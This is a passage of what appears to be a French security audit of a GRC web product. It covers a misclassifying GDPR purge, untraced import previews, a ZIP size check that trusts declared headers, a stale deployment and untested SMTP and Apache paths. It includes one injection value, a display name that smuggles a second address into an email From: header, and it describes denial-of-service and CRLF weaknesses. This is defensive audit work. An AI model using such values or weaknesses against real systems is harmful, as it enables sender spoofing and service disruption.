| **a** | `src/cycle/index.ts:734`, `classer()` | La purge RGPD classe en **`anomalie`** — que sa propre documentation définit comme « un défaut à corriger » — ce qu'elle range ailleurs en `portee_groupe` et `autre_filiale`. `classer()` rend `anomalie` dès que `porteeGroupe > 0 && peutEcrireEnPorteeGroupe`, sans regarder que `dansLaFiliale` vaut **0**. Et les occurrences de portée Groupe et de filiale sœur sont **fusionnées dans une seule ligne** `table.colonne`, dont la classe est décidée par la seule branche Groupe | Purge de « Marie Dupont » dans A, avec un homonyme de portée Groupe et un dans B : rapport `restes: [{table:"personnes", colonne:"nom", dans_la_filiale:0, portee_groupe:1, autres_filiales:1, classe:"anomalie"}]`, soit **`anomalies: 1` sur une purge parfaitement nominale**. C'est la régression exacte que l'en-tête du fichier dit avoir corrigée (« la première rédaction appelait *anomalie* ce qui n'en était pas une »). La liste `avant` porte en outre `classe:"anomalie"` sur **toutes** ses lignes — y compris celles dont la purge répond —, alors que la documentation dit que la classe n'y a pas de sens |
| **b** | `src/import/moteur.ts:664` | Un **aperçu** d'import ne laisse **aucune** trace : ni `journal_audit`, ni ligne `imports`. Il exécute pourtant jusqu'à 5 000 `INSERT` réels et tient une connexion du pool (`poolMax` 10 par défaut). Il est le **défaut** de la route et ne consomme pas l'idempotence : le même fichier se rejoue sans fin | L'essai `test/import/transaction.test.mjs:459` s'intitule « un aperçu n'écrit AUCUNE entrée de journal — **il n'a rien fait** ». Il ne *laisse* rien ; ce n'est pas la même chose |
| **c** | `src/pieces/zip.ts:160` puis `:175` | La borne de décompression contrôle `tailleDecompressee` — **le champ du répertoire central**, c'est-à-dire une déclaration. Pour la méthode 8, `inflateRawSync(…, { maxOutputLength })` mord le résultat réel ; pour la méthode **0** (« stockée »), rien ne recoupe le déclaré et le produit, et `subarray(debut, debut + tailleCompressee)` rend la taille **compressée** | Le commentaire de l'en-tête écrit « un en-tête ZIP ment » — la leçon est appliquée à une branche sur deux. Composé avec **Q-197**, il fait sauter le facteur limitant |
| **d** | `install.sh`, publication | **La recette ne sert pas la révision auditée.** Comparaison octet-à-octet des 79 fichiers publiables : **15 divergents, 14 absents** (`js/i18n/` et `js/data/en/` n'existent pas dans la racine web, ni `approbations.js`, `groupe.js`, `imports.js`, `referentiels_actifs.js`, `socle.js`). Le frontend publié est daté du **3 septembre** | J'ai vérifié que la publication *fonctionnerait* : `FRONTEND_REGLES` porte bien `--include '*/'`, donc les répertoires neufs seraient copiés. Le défaut est que `install.sh --maj` n'a pas été rejoué depuis quatre lots |

---

## 4. Ce que je n'ai pas pu éprouver

**La distinction compte** : six passages de porte ont reconduit « Apache n'est pas
éprouvé » alors que l'installer prenait une minute.

### 4.1 Impossible ici — et ce qu'il faudrait

| Ce qui n'est pas éprouvé | Pourquoi | Ce qu'il faudrait |
|---|---|---|
| **L'envoi SMTP réel de bout en bout** | Le produit n'a pas de relais interne configuré, et poster vers `smtp.office365.com` depuis cette machine enverrait un vrai courriel à une vraie boîte. Le port 587 répond (`220 … Microsoft ESMTP MAIL Service ready`), mais la bannière n'est pas un envoi | Un relais de recette local (le banc en a un : `test/notifications/serveur-smtp.mjs`), monté **derrière l'unité systemd réelle** — c'est le seul montage qui aurait attrapé **Q-199** |
| **Le chemin Apache pour les surfaces neuves** | La racine web sert un build du 3 septembre (**Q-205 d**) : `/api/consolidation`, `/api/import/*`, `/api/cycle/*`, l'écran `#/groupe` et toute l'i18n n'existent pas dans ce qui est servi | `install.sh --maj` puis `--verifier-publication`, puis rejouer **Q-194**, **Q-201** et **Q-203** à travers Apache et la CSP posée par le vhost lui-même |
| **L'AD de production du client** | Règle de prudence inchangée : un banc qui éprouve le cas négatif verrouille des comptes réels | Rien à faire — l'AD simulé `grc-ad` couvre le besoin |

### 4.2 Non tenté — dit franchement

* **Le martèlement concurrent** de `POST /api/import/*` par dix sessions simultanées, pour
  mesurer l'épuisement du pool annoncé au **Q-205 b**. J'ai mesuré le coût unitaire (8,4 s
  et 29,8 s de boucle bloquée), pas la mise en concurrence.
* **La chaîne complète des pièces jointes** (lot L6) : hors du périmètre que la mission m'a
  donné, et déjà couverte par la porte S5.
* **Le contrôle S11** (limitation de rythme) au-delà de la lecture du code : j'ai constaté
  que `limiteur.verifier()` ne crée de compteur que sur un 401 — ce qui rend **Q-197** et
  **Q-198** répétables sans frein —, mais je n'ai pas martelé la route de connexion.
* **`formaterAdresse()`** (`smtp.ts:279`) ne met pas entre guillemets un nom d'affichage
  contenant des caractères spéciaux : `SMTP_NOM_EXPEDITEUR="Direction, <ceo@x.fr>"` produit
  un `From:` que la plupart des analyseurs lisent comme deux adresses. Lu, non mesuré ;
  la source est `/etc/cyber-grc/env`, accessible à root seul — durcissement, pas
  vulnérabilité vivante.
* **`composerRelance()` est appelée hors du `try`** (`relances.ts:525`), après que la
  transaction 1 a déjà réclamé la fenêtre anti-doublon. Une `SERVEUR_URL_PUBLIQUE` que le
  motif de `baseLien` refuse mais que celui de la configuration accepte (celui-ci n'est pas
  ancré en fin) ferait, chaque jour et pour chaque filiale : fenêtre consommée, rien
  d'envoyé, **aucune entrée de journal**. Lu, non reproduit.
* **L'injection CRLF dans les en-têtes SMTP** : `MOTIF_ADRESSE` est ancré `^…$` sans
  drapeau `m`, `validerAdresse` est appelée **avant l'ouverture de la prise**, et
  `valeurEnTeteSure` rejette `\r`, `\n`, `\0`. Le banc éprouve cinq adresses hostiles et
  vérifie qu'**aucune commande** n'est partie. Je n'ai pas rejoué ces essais moi-même ;
  je n'ai trouvé aucun trou en les lisant.

---

## 5. Deux points à durcir sans qu'ils soient des constats

* **`repartition()`** (`src/consolidation/index.ts:244`) interpole `table` et `colonne`
  dans le SQL. Ce n'est **pas** exploitable : sept sites d'appel, tous littéraux, fonction
  non exportée, route qui ne lit aucune entrée. Mais la sûreté est une propriété des
  *appelants*, pas de la fonction. Typer les paramètres en union littérale coûte une ligne
  et fait échouer bruyamment un identifiant erroné — c'est le cas où, selon le tableau du
  `CLAUDE.md` §3, « la liste est le bon outil ».
* **Le garde-fou « aucune garde locale »** existe pour `src/api/journal.ts`
  (`test/journal-lecture/routes.test.mjs:198` balaie le fichier à la recherche de
  `deciderAcces`, `refuserDroit`, `statut: 403`). `src/consolidation/index.ts` **n'en a
  pas**, alors que c'est la seconde route à portée Groupe du produit — celle de la même
  famille que Q-118. La propriété est vraie aujourd'hui (son unique `throw` est un 500 de
  montage) ; elle l'est **par relecture**, pas par construction.
* **Le commentaire d'en-tête de `src/consolidation/index.ts:82`** affirme *« La réponse ne
  porte ni titre, ni nom, ni responsable : uniquement des nombres, et l'identité des
  filiales que la session peut déjà lire par `GET /api/filiales` »*. Elle rend en plus
  `nomCourt` et `pays` (`:673`), que `/api/filiales` ne sert pas. Aucune fuite — ce sont
  des filiales du périmètre —, mais ce dépôt a déjà payé deux fois un commentaire qui
  affirme l'inverse du code.

---

## 6. Ce que cette porte enseigne, et qui vaudra pour les suivantes

1. **Deux moitiés éprouvées séparément ne font pas un aller-retour.** `/api/export` a ses
   essais, `/api/reprise` a les siens, et entre les deux quelqu'un écrit les données à la
   main. Le produit ne restaure pas sa propre sauvegarde depuis qu'un `NULL` est devenu
   `""` (**Q-194**). *Le contrôle qui manque est toujours celui qui relie deux choses que
   deux personnes différentes ont écrites.*
2. **Un refus a un coût, et personne ne le mesure.** `400`, `409`, `413` : les essais
   vérifient que la borne mord, jamais ce que le refus consomme. Deux dénis de service
   (**Q-197**, **Q-198**) vivaient sous des essais qui prouvaient l'existence de la borne
   qu'ils rendaient inopérante.
3. **Un essai qui asserte une absence doit dire pourquoi cette absence est désirable — et
   la raison doit être vraie ailleurs dans le dépôt.** `consolidation.test.mjs:524`
   verrouille l'absence de trace en citant une règle que `src/pieces/index.ts:745`
   contredit (**Q-200**). `deploiement.test.mjs:98` verrouille la configuration qui empêche
   L12 de fonctionner (**Q-199**). `cloisonnement.test.mjs:123` valide un départage qu'il
   n'a jamais eu à faire (**Q-195**).
4. **Un champ ajouté en lecture doit être déclaré dans les deux sens.** `_porteeGroupe` a
   été ajouté à la sortie sans être ajouté à la liste des champs structurels que l'écriture
   ignore — la liste où ses deux frères figurent déjà, pour exactement cette raison
   (**Q-201**).
5. **La question « et qu'apprend celle qui n'a PAS le droit ? » n'a rien donné cette
   fois, et c'est un résultat.** Je l'ai posée à `/api/consolidation`, à `_porteeGroupe`,
   aux erreurs `23503`/`23505` de l'import, aux 403/404 de la purge et de la sortie de
   filiale. Aucune ne fuit. Le cloisonnement de ce produit est solide ; ce sont les
   surfaces qui l'entourent qui ne le sont pas.

---

> **Constats numérotés à partir de Q-194** — le registre du `docs/PLAN_EXECUTION.md` §7
> s'arrêtait à **Q-191**. Chacun doit y recevoir un **propriétaire nommé et une échéance** :
> *un constat chiffré et non attribué est un constat perdu.*
